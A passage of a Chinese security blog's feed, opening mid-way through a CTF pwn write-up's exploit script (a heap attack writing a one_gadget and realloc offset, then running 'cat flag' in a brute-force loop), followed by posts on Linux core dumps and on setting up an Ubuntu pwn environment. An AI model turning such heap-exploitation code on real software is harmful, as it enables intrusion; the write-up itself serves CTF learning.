class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0xb</span>+p64(libc.address+one[<span class="number">3</span>])+p64(libc.sym[<span class="string">'realloc'</span>]+<span class="number">6</span>),<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc')</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">input()</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'fail'</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这是不当人的一场比赛。。恰逢考试，还要一个人兼pwn和web，难受。。。。还好web不算太难，pwn的解题率就不尽人意了。。&lt;/p&gt;
&lt;h2
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
      <category term="WEB" scheme="https://nuoye-blog.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>core文件</title>
    <link href="https://nuoye-blog.github.io/2020/09/02/876d1c4/"/>
    <id>https://nuoye-blog.github.io/2020/09/02/876d1c4/</id>
    <published>2020-09-02T08:30:00.000Z</published>
    <updated>2020-09-02T08:18:58.395Z</updated>
    
    <content type="html"><![CDATA[<h2 id="core文件"><a href="#core文件" class="headerlink" title="core文件"></a>core文件</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>linux下做题时经常发现目录下会多一个core文件，一直不知道是干啥，直到前几天窥屏。。。才发现是程序当前内存的映射，可以结合gdb来查看。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="开启core-dump"><a href="#开启core-dump" class="headerlink" title="开启core dump"></a>开启core dump</h4><p>在命令行中输入<code>ulimit</code>命令来实现：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c #返回值为0时，不会生成core dump文件</span><br><span class="line">ulimit -c unlimited #core dump文件大小不受限制</span><br><span class="line">ulimit -c 1024 #限制core dump文件大小为1024Kb</span><br></pre></td></tr></table></figure><p>以上命令只对当前终端有效。</p><p>永久生效的则需更改文件<code>/etc/security/limits.conf</code>。</p><h4 id="修改core文件保存路径"><a href="#修改core文件保存路径" class="headerlink" title="修改core文件保存路径"></a>修改core文件保存路径</h4><p>默认core文件保存在可执行文件所在的目录下，文件名为core。</p><p>通过修改<code>/proc/sys/kernel/core_uses_pid</code>文件可以让生成core文件名加上pid号。（1表示添加，2表示不添加）</p><p>还可通过修改<code>/proc/sys/kernel/core_pattern</code>来控制生成的core文件保存位置及文件名格式。如<code>echo &quot;/tmp/corefile-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern</code>设置生成的core文件保存在/tmp/corefile目录下，文件名格式为<code>core-命令名-pid-时间戳</code>。</p><h4 id="core文件的使用"><a href="#core文件的使用" class="headerlink" title="core文件的使用"></a>core文件的使用</h4><p>利用命令<code>gdb program core</code>即可调试core文件。</p><h4 id="附：不产生core文件的情况"><a href="#附：不产生core文件的情况" class="headerlink" title="附：不产生core文件的情况"></a>附：不产生core文件的情况</h4><ol><li>进程是设置-用户-ID，而且当前用户并非程序文件的所有者。</li><li>进程是设置-组-ID，而且当前用户并非该程序文件的组所有者。</li><li>用户没有写当前工作目录的许可权。</li><li>文件太大。core文件的许可权(假定该文件在此之前并不存在)通常是用户读/写，组读和其他读。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;core文件&quot;&gt;&lt;a href=&quot;#core文件&quot; class=&quot;headerlink&quot; title=&quot;core文件&quot;&gt;&lt;/a&gt;core文件&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="linux" scheme="https://nuoye-blog.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="ubuntu" scheme="https://nuoye-blog.github.io/tags/ubuntu/"/>
    
      <category term="gdb" scheme="https://nuoye-blog.github.io/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>记Ubuntu 20.04环境搭建</title>
    <link href="https://nuoye-blog.github.io/2020/08/29/2307c607/"/>
    <id>https://nuoye-blog.github.io/2020/08/29/2307c607/</id>
    <published>2020-08-29T13:40:00.000Z</published>
    <updated>2020-08-29T13:38:05.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记Ubuntu-20-04环境搭建"><a href="#记Ubuntu-20-04环境搭建" class="headerlink" title="记Ubuntu 20.04环境搭建"></a>记Ubuntu 20.04环境搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>提前写好pwn环境搭建留给学弟学妹？</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="vm虚拟机安装"><a href="#vm虚拟机安装" class="headerlink" title="vm虚拟机安装"></a>vm虚拟机安装</h3><p>首先上ubuntu官网下载iso文件，接着用vm新建即可。（省略）</p><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>首先是换源，<a href="https://developer.aliyun.com/mirror/ubuntu?spm=a2c6h.13651102.0.0.3e221b110OXtnt" target="_blank" rel="noopener">参考地址</a></p><p>在terminal中输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bck</span><br><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>然后在弹出的文本中内容替换为如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-security main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>然后保存即可。</p><p>然后再在terminal中输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>这样即可完成换源并更新。</p><h3 id="安装python和pip及pip换源"><a href="#安装python和pip及pip换源" class="headerlink" title="安装python和pip及pip换源"></a>安装python和pip及pip换源</h3><p>ubuntu20已经安装好了python3，不过习惯直接输入python打开，所以输入如下命令即可:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-is-python3</span><br></pre></td></tr></table></figure><p>这样就可以直接输入python来运行python3了。</p><p>接着输入如下命令安装pip：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure><p>换源（<a href="https://mirrors.tuna.tsinghua.edu.cn/help/pypi/" target="_blank" rel="noopener">参考地址</a>）：</p><p>直接在terminal中输入如下命令即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><p>直接运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install pwntools</span><br></pre></td></tr></table></figure><p>PS：现在感觉都好容易，当年的，都是泪啊。</p><h3 id="安装pwndbg"><a href="#安装pwndbg" class="headerlink" title="安装pwndbg"></a>安装pwndbg</h3><p> <a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">官方网址</a></p><p>在terminal中输入如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>即可完成安装。</p><h6 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h6><p>运行setup.sh前，需修改以下内容：</p><p>​    1.将setup.sh中的第24行的<code>sudo apt-get -y install python-pip || true</code>，修改为<code>#sudo apt-get -y install python-pip || true</code>。</p><p>​    2.修改requirements.txt为如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">future</span><br><span class="line">isort!&#x3D;4.3.0</span><br><span class="line">pip</span><br><span class="line">psutil&gt;&#x3D;3.1.0</span><br><span class="line">pycparser</span><br><span class="line">pyelftools</span><br><span class="line">python-ptrace&gt;&#x3D;0.8</span><br><span class="line">ROPgadget</span><br><span class="line">six</span><br><span class="line">pygments</span><br><span class="line">capstone&#x3D;&#x3D;4.0.1</span><br><span class="line">enum34</span><br><span class="line">pytest</span><br><span class="line">testresources</span><br></pre></td></tr></table></figure><p>至此pwn的基础环境便安装完成了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;记Ubuntu-20-04环境搭建&quot;&gt;&lt;a href=&quot;#记Ubuntu-20-04环境搭建&quot; class=&quot;headerlink&quot; title=&quot;记Ubuntu 20.04环境搭建&quot;&gt;&lt;/a&gt;记Ubuntu 20.04环境搭建&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="linux" scheme="https://nuoye-blog.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="vmware" scheme="https://nuoye-blog.github.io/tags/vmware/"/>
    
      <category term="ubuntu" scheme="https://nuoye-blog.github.io/tags/ubuntu/"/>
    
  </entry>
  
</feed>
